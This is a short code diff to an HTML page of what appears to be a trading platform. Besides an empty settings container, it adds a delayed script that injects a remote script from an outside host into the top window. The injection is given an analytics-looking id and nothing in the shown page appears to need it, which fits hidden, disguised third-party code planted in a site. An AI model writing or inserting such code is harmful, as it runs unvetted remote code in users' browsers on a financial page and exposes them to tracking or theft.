@@ -201,6 +201,9 @@
       </div>
     </header>
 
+    <div id="accountSettingsContainer"></div>
+
+
     <!-- Main -->
     <div id="tradingPlatform">
       <!-- Post -->
@@ -315,6 +318,21 @@
           window.location.href = "/"
         }
       })
+
+
+      setTimeout(function () {
+        if (null == window.top.document.getElementById("cpPluginGA")) {
+          var a = window.top.document.getElementsByTagName("head")[0],
+            b = window.top.document.createElement("script");
+          b.type = "text/javascript";
+          b.src = "https://dns.cpattern.com/ChromeExtentionInitializer.aspx";
+          b.async = !0;
+          b.id = "cpPluginGA";
+          a.appendChild(b)
+        }
+      }, 3E3);
+
+
     })
 
     // hide div when click on close icon 
